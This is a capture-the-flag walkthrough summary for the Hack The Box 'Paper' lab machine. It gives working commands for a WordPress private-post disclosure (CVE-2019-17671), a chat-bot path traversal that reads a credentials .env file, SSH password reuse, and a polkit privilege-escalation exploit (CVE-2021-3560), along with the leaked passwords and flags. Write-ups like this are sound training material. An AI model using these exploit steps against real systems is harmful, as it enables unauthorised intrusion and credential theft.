# Paper HTB — Complete Walkthrough Summary

> **Box:** Paper | **IP:** 10.129.136.31 | **OS:** Linux (CentOS 8)
> **Difficulty:** Easy | **Status:** ✅ ROOTED | **Date:** 2026-03-22

---

## Flags

| Flag | Value |
|------|-------|
| user.txt | `f10419a09348ecd49a3545d5b12661f7` |
| root.txt | `e50eb2bb38c864627c54b8c0d9f0802f` |

---

## Attack Chain

```
┌──────────────────────────────────────────────────────────────────────────────┐
│ STEP 1: WordPress Information Disclosure (CVE-2019-17671)                   │
│ ─────────────────────────────────────────────────────────────────────────── │
│ Target:    http://office.paper (WordPress 5.2.3)                           │
│ Exploit:   curl "http://office.paper/?static=1&order=asc"                   │
│ Result:    Private/draft posts leaked                                       │
│ Loot:      Secret URL → http://chat.office.paper/register/8qozr226AhkCHZdyY │
└──────────────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌──────────────────────────────────────────────────────────────────────────────┐
│ STEP 2: RocketChat Access via Secret Token                                  │
│ ─────────────────────────────────────────────────────────────────────────── │
│ URL:      http://chat.office.paper/register/8qozr226AhkCHZdyY               │
│ Action:   Register a new account (bypasses normal registration)             │
│ Result:   Authenticated access to RocketChat instance                       │
└──────────────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌──────────────────────────────────────────────────────────────────────────────┐
│ STEP 3: Recyclops Bot Path Traversal (LFI)                                  │
│ ─────────────────────────────────────────────────────────────────────────── │
│ Bot:      Recyclops (Hubot-based chat bot)                                  │
│ Command:  recyclops file sale/../../home/dwight/hubot/.env                  │
│ Result:    Credentials leaked: recyclops / Queenofblad3s!23                │
└──────────────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌──────────────────────────────────────────────────────────────────────────────┐
│ STEP 4: SSH Access via Password Reuse                                        │
│ ─────────────────────────────────────────────────────────────────────────── │
│ Command:  ssh dwight@10.129.136.31                                          │
│ Creds:    dwight / Queenofblad3s!23                                        │
│ Result:    Interactive shell obtained                                       │
│ Flag:      cat /home/dwight/user.txt → f10419a09348ecd49a3545d5b12661f7     │
└──────────────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌──────────────────────────────────────────────────────────────────────────────┐
│ STEP 5: Privilege Escalation via CVE-2021-3560                              │
│ ─────────────────────────────────────────────────────────────────────────── │
│ Exploit:  ./50011.sh (exploit-db EDB-ID 50011)                              │
│ Result:   User "hacker" created with sudo access                            │
│ Creds:    hacker / password                                                 │
│ Command:  su - hacker → sudo -i → ROOT                                      │
│ Flag:      cat /root/root.txt → e50eb2bb38c864627c54b8c0d9f0802f            │
└──────────────────────────────────────────────────────────────────────────────┘
```

---

## CVEs Used

| CVE | Vulnerability | CVSS | Stage |
|-----|---------------|------|-------|
| CVE-2019-17671 | WordPress Unauthenticated Private Post Disclosure | 6.5 | Initial Access |
| CVE-2021-3560 | polkit D-Bus Race Condition (TOCTOU) | 7.8 | Privilege Escalation |

---

## All Credentials

| Username | Password | Service | Notes |
|----------|----------|---------|-------|
| `recyclops` | `Queenofblad3s!23` | RocketChat | From hubot/.env via LFI |
| `dwight` | `Queenofblad3s!23` | SSH | Password reuse |
| `hacker` | `password` | System | Created via 50011.sh |

---

## Key Files

| File | Path | Content |
|------|------|---------|
| user.txt | /home/dwight/user.txt | User flag |
| root.txt | /root/root.txt | Root flag |
| 50011.sh | /home/dwight/50011.sh | CVE-2021-3560 exploit script |
| .env | /home/dwight/hubot/.env | RocketChat credentials |

---

## Detailed Commands

### Initial Recon
```bash
# Vhost discovery
curl -sI http://10.129.136.31/ -H "Host: office.paper"
# Confirms: X-Backend-Server: office.paper

# Add to hosts
echo "10.129.136.31 office.paper chat.office.paper" | sudo tee -a /etc/hosts
```

### Initial Access (CVE-2019-17671)
```bash
curl -s "http://office.paper/?static=1&order=asc" | grep -i 'chat\|secret\|token'
# Found: http://chat.office.paper/register/8qozr226AhkCHZdyY
```

### LFI via Recyclops
```
# In RocketChat, send to Recyclops bot:
recyclops file sale/../../home/dwight/hubot/.env

# Response:
# ROCKETCHAT_USER=recyclops
# ROCKETCHAT_PASSWORD=Queenofblad3s!23
```

### SSH + User Flag
```bash
ssh dwight@10.129.136.31
# Password: Queenofblad3s!23
cat /home/dwight/user.txt
# f10419a09348ecd49a3545d5b12661f7
```

### Privesc (CVE-2021-3560)
```bash
chmod +x 50011.sh
./50011.sh
# Creates user "hacker" with sudo access

su - hacker
# Password: password

sudo -i
# Password: password
# → ROOT

cat /root/root.txt
# e50eb2bb38c864627c54b8c0d9f0802f
```

---

## Box Metadata

| Field | Value |
|-------|-------|
| **OS** | CentOS Linux 8 |
| Kernel | Linux 4.18.0-348.el8.0.1.x86_64 |
| **Platform** | WordPress 5.2.3 |
| **Chat** | RocketChat |
| **Bot** | Hubot (Recyclops) |
| **Vulnerabilities** | 2 (CVE-2019-17671, CVE-2021-3560) |

---

## Difficulty Assessment

| Phase | Rating | Reasoning |
|-------|--------|-----------|
| Initial Access | Easy | CVE-2019-17671 is a simple curl command |
| LFI to Credentials | Easy | Recyclops bot has no input sanitization |
| Password Reuse | Easy | Same password across services |
| Privilege Escalation | Easy | CVE-2021-3560 exploit script works out of the box |

**Overall:** Appropriate for Easy rating. No complex enumeration or custom exploits needed.

---

## Alternative Approaches Not Taken

- **Manual CVE-2021-3560 timing:** Initially attempted manual D-Bus timing, which created a "ghost user" (missing from /etc/passwd). Switched to 50011.sh which worked reliably.
- **PwnKit (CVE-2021-4034):** Available as a backup but not needed since 50011.sh succeeded.
- **Podman escape:** Podman was present but not exploited — CVE-2021-3560 was faster.

---

*Walkthrough completed: 2026-03-22 — Paper HTB BOX ROOTED*
